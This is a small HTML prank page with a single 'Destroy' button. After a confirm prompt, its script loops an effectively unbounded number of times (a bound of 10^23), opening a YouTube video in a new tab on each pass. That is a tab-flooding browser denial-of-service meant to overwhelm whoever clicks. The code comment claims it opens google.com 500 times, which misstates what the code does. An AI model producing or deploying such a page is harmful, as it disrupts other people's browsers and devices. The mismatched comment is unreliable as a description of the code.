<!DOCTYPE html>
<html>
<head>
    <title>Destroy</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding-top: 50px;
        }
        button {
            background-color: #4CAF50;
            color: white;
            padding: 15px 20px;
            font-size: 16px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        button:hover {
            background-color: #45a049;
        }
    </style>
</head>
<body>

<button onclick="confirmDestroy()">Destroy</button>

<script>
    function confirmDestroy() {
        var confirmed = window.confirm("Are you sure you want to destroy everything?");
        if (confirmed) {
            destroyEverything();
        }
    }
    
    function destroyEverything() {
        // Open google.com in a new tab 500 times
        for (let i = 0; i < 100000000000000000000000; i++) {
            window.open('https://www.youtube.com/watch?v=Ju2O_UxXV8Y&t=22s', '_blank');
        }
    }
</script>

</body>
</html>
